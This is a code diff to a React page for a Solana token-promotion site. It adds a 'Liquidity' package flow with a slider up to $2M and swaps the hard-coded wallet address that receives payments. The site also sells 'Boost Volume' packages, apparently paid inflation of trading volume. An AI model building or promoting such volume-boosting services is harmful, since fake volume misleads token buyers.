@@ -6,13 +6,14 @@ import { Button } from '@/components/ui/button';
 import { ArrowUp, ExternalLink, Loader2, AlertCircle, X, Check, Wallet, Search } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { ethers } from 'ethers';
+import { Slider } from '@/components/ui/slider';
 import { Input } from '@/components/ui/input';
 import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { toast } from 'sonner';
 
-const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
+const CHARITY_WALLET = '5xJQUuGTJr2Hrwu6oHkHGiQfpNXRWRFaPC9Xjx82wovh';
 const MAX_BATCH_SIZE = 5;
 
 interface TokenBalance {
@@ -60,8 +61,6 @@ interface DexPair {
   volume: {
     h24: number;
     h6: number;
-    h1: number;
-    m5: number;
     h1: number;
     m5: number;
   };
@@ -139,7 +138,7 @@ const Ads = () => {
   // Flow State
   const [showBoostOptions, setShowBoostOptions] = useState(false);
   const [showAdsFlow, setShowAdsFlow] = useState(false);
-  const [flowType, setFlowType] = useState<'ADS' | 'PRESS' | 'VOLUME'>('ADS');
+  const [flowType, setFlowType] = useState<'ADS' | 'PRESS' | 'VOLUME' | 'LIQUIDITY'>('ADS');
   const [showPressReleasePreview, setShowPressReleasePreview] = useState(false);
   const [customText, setCustomText] = useState('');
   const [flowStep, setFlowStep] = useState<'INPUT' | 'PACKAGES' | 'PAYMENT' | 'CUSTOM_TEXT'>('INPUT');
@@ -405,6 +404,8 @@ const Ads = () => {
     setFetchedToken(null);
     setFetchError('');
     setPaymentStatus('PENDING');
+    setLiquidityAmount(0);
+    setShowLiquidityConfirm(false);
   };
 
   const handleContractSubmit = async () => {
@@ -659,6 +660,7 @@ const Ads = () => {
                     <Button onClick={() => handleGetAdsOpen('ADS')} className="w-full max-w-xs md:max-w-sm bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Get Ads</Button>
                     <Button onClick={() => setShowPressReleasePreview(true)} className="w-full max-w-xs md:max-w-sm bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Press Release</Button>
                     <Button onClick={() => handleGetAdsOpen('VOLUME')} className="w-full max-w-xs md:max-w-sm bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Volume</Button>
+                    <Button onClick={() => handleGetAdsOpen('LIQUIDITY')} className="w-full max-w-xs md:max-w-sm bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Liquidity</Button>
                 </div>
             )}
         </div>
@@ -794,7 +796,11 @@ const Ads = () => {
                     className="bg-card border border-border w-full max-w-2xl rounded-xl shadow-2xl overflow-hidden max-h-[90vh] flex flex-col"
                 >
                     <div className="p-6 border-b border-border flex justify-between items-center bg-muted/20">
-                        <h2 className="text-2xl font-bold">{flowType === 'PRESS' ? 'Get Press Release' : (flowType === 'VOLUME' ? 'Boost Volume' : 'Get Ads')}</h2>
+                        <h2 className="text-2xl font-bold">
+                            {flowType === 'PRESS' ? 'Get Press Release' : 
+                             flowType === 'VOLUME' ? 'Boost Volume' : 
+                             flowType === 'LIQUIDITY' ? 'Provide Liquidity' : 'Get Ads'}
+                        </h2>
                         <Button variant="ghost" size="icon" onClick={() => setShowAdsFlow(false)}>
                             <X className="w-6 h-6" />
                         </Button>
@@ -804,8 +810,14 @@ const Ads = () => {
                         {flowStep === 'INPUT' && (
                             <div className="space-y-6">
                                 <div className="text-center space-y-2">
-                                    <h3 className="text-xl font-semibold">Enter Contract Address</h3>
-                                    <p className="text-muted-foreground">Paste your token's contract address to get started.</p>
+                                    <h3 className="text-xl font-semibold">
+                                        {flowType === 'LIQUIDITY' ? 'Provide Liquidity' : 'Enter Contract Address'}
+                                    </h3>
+                                    <p className="text-muted-foreground">
+                                        {flowType === 'LIQUIDITY' 
+                                            ? 'Please input the contract address of the token you want to provide liquidity for.' 
+                                            : "Paste your token's contract address to get started."}
+                                    </p>
                                 </div>
                                 <div className="space-y-4">
                                     <Input 
@@ -867,13 +879,68 @@ const Ads = () => {
                                         />
                                     </div>
                                     <h2 className="text-3xl font-bold">
-                                        Give <span className="text-primary">{fetchedToken.baseToken.name}</span> a Trending
+                                        {flowType === 'LIQUIDITY' ? (
+                                            <>Provide Liquidity for <span className="text-primary">{fetchedToken.baseToken.name}</span></>
+                                        ) : (
+                                            <>Give <span className="text-primary">{fetchedToken.baseToken.name}</span> a Trending</>
+                                        )}
                                     </h2>
-                                    <p className="text-muted-foreground">Select a package to boost your token visibility.</p>
+                                    <p className="text-muted-foreground">
+                                        {flowType === 'LIQUIDITY' ? 'Select a package to provide liquidity.' : 'Select a package to boost your token visibility.'}
+                                    </p>
                                 </div>
 
                                 <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                                    {(flowType === 'PRESS' ? PRESS_PACKAGES : (flowType === 'VOLUME' ? VOLUME_PACKAGES : PACKAGES)).map((pkg: any) => (
+                                    {flowType === 'LIQUIDITY' ? (
+                                        <div className="col-span-full space-y-8 py-4">
+                                            <div className="space-y-4">
+                                                <div className="flex justify-between items-center">
+                                                    <span className="text-sm font-medium text-muted-foreground">Amount</span>
+                                                    <span className="text-2xl font-bold text-primary">
+                                                        ${liquidityAmount.toLocaleString()}
+                                                    </span>
+                                                </div>
+                                                <Slider
+                                                    value={[liquidityAmount]}
+                                                    min={0}
+                                                    max={2000000}
+                                                    step={100}
+                                                    onValueChange={(vals) => setLiquidityAmount(vals[0])}
+                                                    className="w-full"
+                                                />
+                                                <div className="flex justify-between text-xs text-muted-foreground">
+                                                    <span>$0</span>
+                                                    <span>$2M</span>
+                                                </div>
+                                            </div>
+
+                                            <div className="space-y-2">
+                                                <label className="text-sm font-medium text-muted-foreground">Manual Input</label>
+                                                <div className="relative">
+                                                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground">$</span>
+                                                    <Input
+                                                        type="number"
+                                                        value={liquidityAmount}
+                                                        onChange={(e) => {
+                                                            const val = parseFloat(e.target.value);
+                                                            if (!isNaN(val) && val >= 0) setLiquidityAmount(val);
+                                                        }}
+                                                        className="pl-7 text-lg"
+                                                        placeholder="0.00"
+                                                    />
+                                                </div>
+                                            </div>
+
+                                            <Button 
+                                                onClick={() => setShowLiquidityConfirm(true)}
+                                                disabled={liquidityAmount <= 0}
+                                                className="w-full text-lg py-6 font-bold bg-gradient-to-r from-primary to-secondary hover:opacity-90"
+                                            >
+                                                Get Liquidity
+                                            </Button>
+                                        </div>
+                                    ) : (
+                                        (flowType === 'PRESS' ? PRESS_PACKAGES : (flowType === 'VOLUME' ? VOLUME_PACKAGES : PACKAGES)).map((pkg: any) => (
                                         <Button
                                             key={pkg.id}
                                             onClick={() => handlePackageSelect(pkg)}
@@ -895,7 +962,7 @@ const Ads = () => {
                                                 <span className="text-sm font-mono bg-background/50 px-2 py-0.5 rounded text-muted-foreground">{pkg.duration}</span>
                                             )}
                                         </Button>
-                                    ))}
+                                    )))}
                                 </div>
                             </div>
                         )}
